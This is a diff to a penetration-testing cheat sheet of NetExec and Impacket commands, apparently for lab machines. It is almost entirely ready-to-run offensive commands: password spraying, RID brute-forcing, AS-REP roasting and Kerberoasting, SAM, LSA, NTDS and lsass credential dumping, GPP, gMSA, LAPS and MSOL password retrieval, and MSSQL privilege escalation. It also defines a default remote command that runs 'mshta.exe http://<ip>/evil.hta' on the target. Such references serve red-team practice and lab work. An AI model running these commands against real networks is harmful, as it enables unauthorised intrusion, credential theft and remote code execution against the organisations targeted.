@@ -3,7 +3,8 @@
 ;$ ip: $ip
 ;$ username: ''
 ;$ password:  ''
-
+;$ relay-file: 'relay-list.txt'
+;$ command: 'mshta.exe http://<ip>/evil.hta'
 
 # SMB Connectivity Check
 nxc smb <ip>
@@ -42,19 +43,20 @@ nxc smb <ip> -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER
 nxc smb <ip> -u '<username>' -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
 
 
+## Working files on with SMB Shares
+
 # NetExec SMB Put file on remote
-nxc smb <ip> -u '<username>' -p '<password>' --put-file /workspace/Invoke-Mimi.ps1 \\users\\public\\Invoke-Mimi.ps1
-
+nxc smb <ip> -u '<username>' -p '<password>' --put-file <local-file> <remote-file>
 # NetExec SMB Get file from remote
-nxc smb <ip> -u '<username>' -p '<password>' --get-file \\users\\public\\File.docx /workspace/File.docx
+nxc smb <ip> -u '<username>' -p '<password>' --get-file <remote-file> <local-file>
 
 
-# Save a list of relays (SMB signing = False)
-nxc smb <ip> --gen-relay-list relay-list.txt
+# Get SMB relays with no SMB signing
+nxc smb <ip> --gen-relay-list <relay-file>
 
 
 # Execute Command or file
-nxc smb <ip> -u '<username>' -p '<password>' -x 'mshta.exe http://<ip>/evil.hta'
+nxc smb <ip> -u '<username>' -p '<password>' -x '<command>'
 
 
 ## Enumerating Password Policy
@@ -69,32 +71,41 @@ nxc smb <ip> -u 'guest' -p '' --pass-pol
 nxc smb <ip> -u '<username>' -p '<password>' --pass-pol
 
 
-## Password spraying:
-nxc smb <ip> -u userfile -p passwordfile # optional --continue-on-success --no-bruteforce
+## SMB password spraying
+
+# SMB Password Spray with user/pass list
+nxc smb <ip> -u user.txt -p pass.txt
+
+# SMB Password Spray with user/pass list (contiunue/no bruteforcing)
+nxc smb <ip> -u user.txt -p pass.txt --continue-on-success --no-bruteforce
 
 
 ## Enumerating Users
 
-# Enumerate Users NULL session
+# Enumerate Users NULL session (SMB)
 nxc smb <ip> -u '' -p '' --users
+# Enumerate Users NULL session (LDAP)
 nxc ldap <ip> -u '' -p '' --users
-# Enumerate Users Anonymous session
+# Enumerate Users Anonymous session (SMB)
 nxc smb <ip> -u 'anonymous' -p '' --local-auth --users
+# Enumerate Users Anonymous session (LDAP)
 nxc ldap <ip> -u 'anonymous' -p '' --local-auth --users
-# Enumerate Users Guest session
+# Enumerate Users Guest session (SMB)
 nxc smb <ip> -u 'guest' -p '' --users
+# Enumerate Users Guest session (LDAP)
 nxc ldap <ip> -u 'guest' -p '' --users
-# Enumerate Users Authenticated session
+# Enumerate Users Authenticated session (SMB)
 nxc smb <ip> -u '<username>' -p '<password>' --users
+# Enumerate Users Authenticated session (LDAP)
 nxc ldap <ip> -u '<username>' -p '<password>' --users
 
-# Enumerate users by bruteforcing the RID + save users list (the 10000 is optinal)
+# Enumerate users by bruteforcing the RID + save users list (10000 is optional)
 nxc smb <ip> -u guest -p '' --rid-brute 10000 --log rid-brute.txt
-# Enumerate Logged-On Users
+# Enumerate Logged-on Users (Authenticated)
 nxc smb <ip> -u '<username>' -p '<password>' --loggedon-users
 
 # Get user's description
-nxc ldap <ip> -u '<user>' -p '<pass>' -M get-desc-users
+nxc ldap <ip> -u '<username>' -p '<password>' -M get-desc-users
 
 
 ## Enumerating Groups
@@ -111,24 +122,36 @@ nxc smb <ip> -u '<username>' -p '<password>' --groups
 
 ## FTP
 
+# List files on FTP server
 nxc ftp <ip> -u '<username>' -p '<password>' --ls
-nxc ftp <ip> -u '<username>' -p '<password>' --ls '<Folder>'
-nxc ftp <ip> -u '<username>' -p '<password>' --ls '<Folder>' --get '<File>'
+# List files on FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --ls '<path>'
+# Get file from FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --get '<file>'
 
 
 # Asreproast- Get and try cracking user account hash
 nxc ldap <ip> -u '<username>' -p '' --asreproast asreproast.txt --kdcHost <ip>
-
+# Impacket Asreproast
+GetNPUsers.py <target> -usersfile users.txt -dc-ip <ip>
 # Kerberoasting - Get and try cracking SPN account hash
 nxc ldap <ip> -u '<username>' -p '<password>' --kerberoasting kerberoasting.txt --kdcHost <ip>
+# Impacket Kerberoasting
+GetUserSPNs.py -usersfile users.txt -no-pass -dc-ip <ip> -dc-host <ip> <target> -target-domain <domain>
+
+## NetExec Query LDAP
 
 
-# ldap query
+# NetExec Query LDAP (example 1)
 nxc ldap <ip> -u '' -p '' --query "(objectclass=*)" ""
+# NetExec Query LDAP (example 2)
 nxc ldap <ip> -u '' -p '' --query "(sAMAccountName=<username>)" ""
+# LDAPSearch Query LDAP
+ldapsearch -o ldif_wrap=no -xLLLH ldap://<ip> -D '<domain>\<username>' -w '<password>' -b "DC=intelligence,DC=htb" '(samaccountname=<username>)'
 
 
 ## Passwords
+
 # Extract the SAM File + Dump Cached Passwords
 nxc smb <ip> -u '<username>' -p '<password>' --sam --lsa --dpap
 # Dump lsass with lsassy module:
@@ -137,26 +160,33 @@ nxc smb <ip> -u '<username>' -p '<password>' -M lsassy -o METHOD=comsvcs_stealth
 nxc smb <ip> -d <domain> -u '<username>' -p '<password>' --ntds
 
 ## Get GPP policies
+
 # `gpp_password` decrypts passwords stored in the Group.xml file
 nxc smb <dc-ip> -u '' -p '' -M gpp_password
 # `gpp_autologin` retrieves autologin information from the Registry.xml file
 nxc smb <dc-ip> -u '' -p '' -M gpp_autologin
 
 ## Group Managed Service Accounts (gMSA)
+
 # Requirements: user that can read msDS-ManagedPassword (Domain Admins cant read it by defualt)
 nxc ldap <ip> -u '<username>' -p '<password>' --gmsa
 
 ## LAPS (Local administrator password solution) - retrieves both LAPS v1 and v2 passwords
+
 # Requirements: Domain Admins or user that have Read/WriteProperty to the ms-MCS-AdmPwd attribute
 nxc smb <ip> -u '<username>' -p '<password>' --laps    # add --lsa use the laps admin to dump lsa
 
 ## Azure - Entra Connect Sync service username looks like 'MSOL_16fb75d0227d'
-# Requirements: 'ADSyncAdmins' or 'local Administrators groups' on machine with AD Connect service to get the MSOL account password and dcsync with it
-nxc smb <ip> -u '<username>' -p '<password>' -M msol
-# or
+
+# Microsoft Online
+nxc smb <ip> -u '<username>' -p '<password>' -M msol # Requirements: 'ADSyncAdmins' or 'local Administrators groups' on machine with AD Connect service to get the MSOL account password and dcsync with it
+# Microsoft Online #2
 nxc smb <ip> -u '<username>' -p '<password>' -M msol -o MSOL_PS1=C:\...\nxc\data\msol_dump\msol_dump.ps1
 
 
 ## mssql_priv
+
+# NetExec MsSQL
 nxc mssql <ip> -u '<username>' -p '<password>' -M mssql_priv
+# NetExec MsSQL (privesc module)
 nxc mssql <ip> -u '<username>' -p '<password>' -M mssql_priv -o ACTION=privesc
